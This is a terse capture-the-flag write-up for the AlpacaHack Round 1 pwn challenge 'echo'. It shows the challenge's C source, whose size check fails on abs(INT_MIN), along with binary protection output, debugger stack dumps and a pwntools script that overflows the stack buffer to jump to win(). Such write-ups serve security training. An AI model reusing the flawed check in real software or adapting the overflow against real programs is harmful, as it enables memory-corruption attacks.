# AlpacaHack Round 1 (Pwn) Writeup

> 原文: https://www.ctfiot.com/200153.html
> ID: 200153


```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUF_SIZE 0x100

/* Call this function! */
void win() {
 char *args[] = {"/bin/cat", "/flag.txt", NULL};
 execve(args[0], args, NULL);
 exit(1);
}

int get_size() {
 // Input size
 int size = 0;
 scanf("%d%*c", &size);

 // Validate size
 if ((size = abs(size)) > BUF_SIZE) {
 puts("[-] Invalid size");
 exit(1);
 }

 return size;
}

void get_data(char *buf, unsigned size) {
 unsigned i;
 char c;

 // Input data until newline
 for (i = 0; i < size; i++) {
 if (fread(&c, 1, 1, stdin) != 1) break;
 if (c == '\n') break;
 buf[i] = c;
 }
 buf[i] = '\0';
}

void echo() {
 int size;
 char buf[BUF_SIZE];

 // Input size
 printf("Size: ");
 size = get_size();

 // Input data
 printf("Data: ");
 get_data(buf, size);

 // Show data
 printf("Received: %s\n", buf);
}

int main() {
 setbuf(stdin, NULL);
 setbuf(stdout, NULL);
 echo();
 return 0;
}
```



```
Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
```



```
int get_size() {
 // Input size
 int size = 0;
 scanf("%d%*c", &size);

 // Validate size
 if ((size = abs(size)) > BUF_SIZE) {
 puts("[-] Invalid size");
 exit(1);
 }

 return size;
}
```



```
0272| 0x7fffffffdca0 --> 0x7fffffffdcb0 --> 0x1
0280| 0x7fffffffdca8 --> 0x4013d4 (<main+58>: mov eax,0x0)
0288| 0x7fffffffdcb0 --> 0x1
```



```
0000| 0x7fffffffdb90 --> 0x4141414141 ('AAAAA')
```



```
from pwn import *

win = ELF("./echo").symbols["win"]

p = process('./echo')
#p = remote("[redacted]", [redacted])

p.sendlineafter(b"Size: ", b"-2147483648")
p.sendlineafter(b"Data: ", b'A' * 280 + p32(win))
print(p.recvall())
```
